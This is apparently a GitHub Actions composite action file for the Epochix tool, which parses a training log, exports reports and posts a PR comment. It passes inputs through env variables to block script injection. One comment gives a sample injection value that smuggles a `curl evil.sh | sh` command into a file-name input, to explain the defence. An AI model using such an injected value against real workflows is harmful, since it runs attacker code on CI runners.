name: "Epochix"
description: >
  Parse a training log and upload an HTML report as a workflow artifact.
  Optionally post a Markdown summary as a PR comment.

branding:
  icon: "bar-chart-2"
  color: "purple"

inputs:
  log-file:
    description: "Path to the training log file (relative to workspace root)."
    required: true
  task:
    description: >
      Force task type: auto, classification, detection, regression,
      biometric, gaze, nlp. Default: auto.
    required: false
    default: "auto"
  export:
    description: "Export formats (comma-separated): html,md,pdf. Default: html,md"
    required: false
    default: "html,md"
  artifact-name:
    description: "Name of the uploaded workflow artifact."
    required: false
    default: "epochix-report"
  comment-on-pr:
    description: "Post a Markdown summary as a PR comment (true/false)."
    required: false
    default: "true"
  python-version:
    description: "Python version to use."
    required: false
    default: "3.12"

outputs:
  run-id:
    description: "The epochix run ID."
    value: ${{ steps.parse.outputs.run-id }}
  grade:
    description: "Final letter grade (A+, A, B, …, F)."
    value: ${{ steps.parse.outputs.grade }}
  html-report:
    description: "Path to the exported HTML report."
    value: ${{ steps.export.outputs.html-path }}
  markdown-summary:
    description: "Path to the Markdown summary."
    value: ${{ steps.export.outputs.md-path }}

runs:
  using: "composite"
  steps:
    - name: Set up Python
      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5
      with:
        python-version: ${{ inputs.python-version }}

    - name: Install epochix
      shell: bash
      run: pip install "epochix" --quiet

    - name: Parse log file
      id: parse
      shell: bash
      # Inputs arrive through env, never through ${{ }} inside `run:`. GitHub
      # substitutes an expression into the script *before* bash sees it, so a
      # log-file value of `x"; curl evil.sh | sh; "` would run in the runner —
      # and callers routinely wire these inputs to PR titles and branch names.
      # As an env var the value is data to bash, whatever it contains.
      env:
        INPUT_TASK: ${{ inputs.task }}
        INPUT_LOG_FILE: ${{ inputs.log-file }}
      run: |
        TASK_ARGS=()
        if [ "$INPUT_TASK" != "auto" ]; then
          TASK_ARGS=(--task "$INPUT_TASK")
        fi

        # `epochix run --json`, not `epochix batch`: there has never been a
        # `batch` command, so this step failed for every caller until 0.5.80.
        # stderr is NOT folded into stdout (the old `2>&1` did) — a single
        # warning line would land in front of the document and break json.load.
        OUTPUT=$(epochix run "$INPUT_LOG_FILE" "${TASK_ARGS[@]}" --json)

        RUN_ID=$(echo "$OUTPUT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['id'])")
        GRADE=$(echo "$OUTPUT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('final_grade') or '?')")

        echo "run-id=$RUN_ID" >> "$GITHUB_OUTPUT"
        echo "grade=$GRADE" >> "$GITHUB_OUTPUT"
        echo "### Epochix" >> "$GITHUB_STEP_SUMMARY"
        echo "- **Run ID:** \`$RUN_ID\`" >> "$GITHUB_STEP_SUMMARY"
        echo "- **Grade:** $GRADE" >> "$GITHUB_STEP_SUMMARY"

    - name: Export reports
      id: export
      shell: bash
      # Same rule for step outputs: run-id is derived from the parsed log, so
      # it is untrusted for the same reason the log file is.
      env:
        RUN_ID: ${{ steps.parse.outputs.run-id }}
        EXPORTS: ${{ inputs.export }}
      run: |
        HTML_PATH=""
        MD_PATH=""

        if echo "$EXPORTS" | grep -q "html"; then
          epochix export "$RUN_ID" --format html --output report.html
          HTML_PATH="report.html"
        fi
        if echo "$EXPORTS" | grep -q "md"; then
          epochix export "$RUN_ID" --format md --output report.md
          MD_PATH="report.md"
        fi
        if echo "$EXPORTS" | grep -q "pdf"; then
          epochix export "$RUN_ID" --format pdf --output report.pdf || true
        fi

        echo "html-path=$HTML_PATH" >> "$GITHUB_OUTPUT"
        echo "md-path=$MD_PATH" >> "$GITHUB_OUTPUT"

    - name: Upload artifact
      uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
      with:
        name: ${{ inputs.artifact-name }}
        path: |
          report.html
          report.md
          report.pdf
        if-no-files-found: ignore

    - name: Comment on PR
      if: >
        inputs.comment-on-pr == 'true' &&
        github.event_name == 'pull_request' &&
        steps.export.outputs.md-path != ''
      uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7
      # Interpolating into `script:` is the same hazard as interpolating into
      # `run:` — the expression is substituted before Node parses the source,
      # so a grade or path containing a backtick or quote becomes JavaScript.
      env:
        MD_PATH: ${{ steps.export.outputs.md-path }}
        GRADE: ${{ steps.parse.outputs.grade }}
      with:
        script: |
          const fs = require('fs');
          const mdPath = process.env.MD_PATH;
          if (!mdPath || !fs.existsSync(mdPath)) { return; }

          const body = fs.readFileSync(mdPath, 'utf8');
          const header = `## 📊 Epochix — Grade: ${process.env.GRADE}\n\n`;

          await github.rest.issues.createComment({
            owner: context.repo.owner,
            repo: context.repo.repo,
            issue_number: context.payload.pull_request.number,
            body: header + body,
          });
